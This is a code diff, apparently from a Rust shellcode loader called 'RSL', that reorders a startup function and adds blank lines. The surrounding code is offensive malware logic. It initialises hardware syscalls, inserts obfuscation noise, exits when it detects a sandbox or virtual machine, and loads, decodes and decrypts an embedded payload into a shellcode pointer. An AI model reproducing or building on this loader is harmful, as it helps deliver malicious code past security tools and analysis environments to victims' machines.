@@ -20,6 +20,16 @@ use rsl_macros::obfuscation_noise_macro;
 #[cfg(feature = "debug")]
 use utils::{print_error, print_message, print_success};
 
+fn start_program() {
+    #[cfg(feature = "hw_syscall")]
+    unsafe {
+        syscall::hw_syscall::init_hw_syscalls();
+    }
+    obfuscation_noise_macro!();
+    #[cfg(feature = "debug")]
+    print_message("RSL started in debug mode.");
+}
+
 fn exit_program() -> ! {
     #[cfg(feature = "hw_syscall")]
     unsafe {
@@ -30,15 +40,6 @@ fn exit_program() -> ! {
     std::process::exit(1);
 }
 
-fn start_program() {
-    #[cfg(feature = "hw_syscall")]
-    unsafe {
-        syscall::hw_syscall::init_hw_syscalls();
-    }
-    obfuscation_noise_macro!();
-    #[cfg(feature = "debug")]
-    print_message("RSL started in debug mode.");
-}
 fn run() -> utils::RslResult<()> {
     #[cfg(feature = "sandbox")]
     if sandbox::guard_vm() {
@@ -59,6 +60,7 @@ fn run() -> utils::RslResult<()> {
     let encrypted_data = load()?;
     #[cfg(feature = "debug")]
     print_success("Payload loaded successfully.");
+
     obfuscation_noise_macro!();
 
     let decrypted_data = decode(&encrypted_data).unwrap();
@@ -66,6 +68,7 @@ fn run() -> utils::RslResult<()> {
     let (shellcode_ptr, shellcode_len) = unsafe { decrypt(&decrypted_data)? };
     #[cfg(feature = "debug")]
     print_success("Payload decrypted successfully.");
+
     obfuscation_noise_macro!();
 
     unsafe {
